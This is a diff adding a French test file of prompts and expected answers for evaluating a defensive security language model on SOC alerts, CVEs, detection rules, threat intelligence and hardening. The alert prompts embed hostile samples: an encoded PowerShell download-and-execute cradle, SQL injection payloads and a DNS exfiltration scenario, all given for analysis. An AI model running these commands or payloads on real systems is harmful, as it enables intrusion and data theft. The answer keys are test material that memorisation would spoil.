@@ -1,0 +1,193 @@
+################################################################################
+#  SCRIPTS DE TEST — ANALYSE CYBERSÉCURITÉ DÉFENSIVE
+#  Modèles ciblés : SecurityLLM (génératif)
+#  Date : 2026-06-04
+################################################################################
+
+# ============================================================
+# CATÉGORIE 1 — ANALYSE D'ALERTES SOC
+# ============================================================
+
+[TEST-SOC-001] Alerte SSH Brute Force
+---
+PROMPT: Tu es un analyste SOC niveau 2. Analyse cette alerte et donne une procédure de réponse :
+Alerte : Multiple failed SSH login attempts detected
+Source IP: 185.220.101.45
+Target: prod-server-01 (10.0.1.50)
+Port: 22
+Tentatives : 847 en 15 minutes
+Pays source : Russie (TOR exit node)
+Timestamp: 2026-06-04 03:22:17 UTC
+---
+RÉPONSE_ATTENDUE: Procédure de blocage IP, vérification logs auth, isolation si compromission
+
+[TEST-SOC-002] Détection Exfiltration DNS
+---
+PROMPT: Analyse cette alerte de potentielle exfiltration de données via DNS :
+Alerte : Anomalous DNS query volume
+Workstation: WS-FINANCE-042
+DNS Queries/min: 1,247 (baseline: 15-30)
+Domaines requêtés: *.data.evil-c2.xyz (sous-domaines encodés base64)
+Taille moyenne sous-domaine: 63 caractères
+Durée: 45 minutes continues
+Pattern: requêtes TXT uniquement
+---
+RÉPONSE_ATTENDUE: Technique DNS tunneling, isoler poste, analyser payload, bloquer domaine
+
+[TEST-SOC-003] Ransomware en cours
+---
+PROMPT: Tu es le CISO de garde. Un incident ransomware est en cours. Donne le plan de réponse immédiat :
+Alerte critique : File encryption detected on multiple endpoints
+Endpoints touchés: 23/450 (et ça progresse)
+Fichiers chiffrés : extension .lockbit4
+Note de rançon : README_RESTORE.txt détectée
+Propagation : via SMB latéral (port 445)
+Heure détection : 2026-06-04 02:15 UTC
+Premier endpoint : DC-BACKUP-01 (contrôleur de domaine secondaire)
+---
+RÉPONSE_ATTENDUE: Isolation réseau, arrêt propagation SMB, activation plan de continuité
+
+[TEST-SOC-004] Activité PowerShell suspecte
+---
+PROMPT: Analyse ce log PowerShell suspect et détermine s'il s'agit d'une menace :
+EventID: 4104 (Script Block Logging)
+Host: WS-DEV-019
+User: john.admin
+Script:
+$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)) | IEX
+Process Parent: explorer.exe
+Time: 2026-06-04 14:33:22 UTC
+---
+RÉPONSE_ATTENDUE: Obfuscation Base64, téléchargement payload, exécution IEX — malveillant
+
+[TEST-SOC-005] Alerte WAF — Injection SQL
+---
+PROMPT: Analyse cette série d'alertes WAF et évalue la menace :
+Source IP: 103.25.67.89 (ASN: AS4808 - China Unicom)
+Target: https://app.company.com/api/v2/users
+Requêtes en 5 minutes :
+1. GET /api/v2/users?id=1' OR '1'='1
+2. GET /api/v2/users?id=1 UNION SELECT NULL,username,password FROM users--
+3. POST /api/v2/users {"name":"admin'--","role":"1"}  
+4. GET /api/v2/users?id=1; WAITFOR DELAY '0:0:5'--
+5. GET /api/v2/users?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+WAF Status: 3 blocked, 2 passed (blind SQLi)
+---
+RÉPONSE_ATTENDUE: Attaque SQL injection active, escalade de techniques, 2 requêtes passées
+
+# ============================================================
+# CATÉGORIE 2 — ANALYSE DE VULNÉRABILITÉS (CVE)
+# ============================================================
+
+[TEST-CVE-001] Log4Shell
+---
+PROMPT: Explique la vulnérabilité CVE-2021-44228 (Log4Shell) et donne les mesures de mitigation pour un environnement Java enterprise.
+---
+RÉPONSE_ATTENDUE: RCE via JNDI lookup dans Log4j, mise à jour 2.17+, WAF rules, désactiver lookups
+
+[TEST-CVE-002] Vulnérabilité critique récente
+---
+PROMPT: Analyse cette CVE et recommande des actions :
+CVE-2026-21473
+CVSS: 9.8 (Critical)
+Vendor: Cisco
+Produit: Cisco IOS XE
+Type: Remote Code Execution
+Vecteur: HTTP (port 443)
+Pré-requis: Interface web-ui activée
+Exploitation: Active in the wild
+Patch disponible: Oui (version 17.12.3)
+---
+RÉPONSE_ATTENDUE: Patch immédiat, désactiver web-ui si non nécessaire, détecter IOCs
+
+[TEST-CVE-003] Analyse CVSS détaillée
+---
+PROMPT: Décompose le vecteur CVSS suivant et explique chaque composant pour un rapport de vulnérabilité :
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+Score: 10.0
+---
+RÉPONSE_ATTENDUE: Accès réseau, complexité faible, pas de privilèges, pas d'interaction, scope changé, impacts max
+
+# ============================================================
+# CATÉGORIE 3 — RÉDACTION DE RÈGLES DÉTECTION
+# ============================================================
+
+[TEST-RULE-001] Règle Sigma — Mimikatz
+---
+PROMPT: Écris une règle Sigma pour détecter l'utilisation de Mimikatz sur un endpoint Windows. Couvre les variantes courantes (sekurlsa, kerberos, lsadump).
+---
+RÉPONSE_ATTENDUE: Règle Sigma format YAML avec logsource, detection, condition
+
+[TEST-RULE-002] Règle YARA — Webshell PHP
+---
+PROMPT: Écris une règle YARA pour détecter les webshells PHP courants (c99, r57, WSO). La règle doit couvrir les patterns d'obfuscation courants (eval, base64_decode, gzinflate).
+---
+RÉPONSE_ATTENDUE: Règle YARA avec strings et condition couvrant les webshells PHP
+
+[TEST-RULE-003] Règle Suricata — C2 Beacon
+---
+PROMPT: Écris une règle Suricata/Snort pour détecter un beacon Cobalt Strike avec les caractéristiques suivantes :
+- Interval: 60 secondes ±10% jitter  
+- User-Agent rotatif
+- URI patterns: /updates, /visit.js, /submit.php
+- HTTP POST avec données chiffrées en cookie
+---
+RÉPONSE_ATTENDUE: Règle Suricata avec flow, content matches, pcre
+
+# ============================================================
+# CATÉGORIE 4 — THREAT INTELLIGENCE
+# ============================================================
+
+[TEST-TI-001] Analyse IOC
+---
+PROMPT: Analyse ces indicateurs de compromission et donne un verdict :
+IOCs collectés :
+- IP: 45.33.32.156 (Shodan: Cobalt Strike Team Server)
+- Domain: update-service.windowslive.com.xyz
+- Hash SHA256: 3b4a82738e1d2f9c05a6e7f8d4b2c1a0e9f8d7c6b5a4e3d2c1b0a9f8e7d6c5b4
+- URL: https://pastebin.com/raw/Abc12345 (payload dropper)
+- Email: admin@microsft-support.com (typosquat)
+- Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchost
+- File: C:\Windows\Temp\svc_host.exe (4.2 MB, UPX packed)
+---
+RÉPONSE_ATTENDUE: Cobalt Strike, C2 infrastructure, persistence via Run key, domaine typosquat
+
+[TEST-TI-002] MITRE ATT&CK Mapping
+---
+PROMPT: Mappe les techniques observées suivantes sur le framework MITRE ATT&CK :
+1. Spear-phishing email avec pièce jointe macro Word
+2. Exécution PowerShell encodée en base64
+3. Credential dumping via lsass.exe
+4. Mouvement latéral via PsExec
+5. Exfiltration via DNS tunneling
+6. Persistance via tâche planifiée (schtasks)
+---
+RÉPONSE_ATTENDUE: Mapping T1566.001, T1059.001, T1003.001, T1570, T1048.001, T1053.005
+
+# ============================================================
+# CATÉGORIE 5 — HARDENING & CONFIGURATION
+# ============================================================
+
+[TEST-HARD-001] Durcissement serveur Linux
+---
+PROMPT: Donne un checklist de hardening pour un serveur Ubuntu 24.04 LTS exposé en DMZ avec les services : Nginx, PostgreSQL, SSH. Format : commandes exécutables.
+---
+RÉPONSE_ATTENDUE: Désactiver root SSH, configurer fail2ban, UFW rules, TLS, kernel hardening
+
+[TEST-HARD-002] Politique de sécurité Active Directory
+---
+PROMPT: Propose une politique de sécurité Active Directory pour prévenir les attaques Kerberoasting et Golden Ticket. Inclus les GPO recommandées.
+---
+RÉPONSE_ATTENDUE: Comptes de service MSA/gMSA, AES256 Kerberos, LAPS, Protected Users group
+
+################################################################################
+#  COMMANDES DE TEST
+################################################################################
+
+# --- Test SecurityLLM (génératif) ---
+# python train_adaptive_pipeline.py predict --model outputs/securityllm-targeted-lora --prompt "PROMPT_ICI"
+# python train_adaptive_pipeline.py predict --model outputs/securityllm-merged --prompt "PROMPT_ICI" --max-new-tokens 500
+
+# --- Test batch ---
+# python test_runner.py --test-file tests/test_cyber_defense.txt --model securityllm
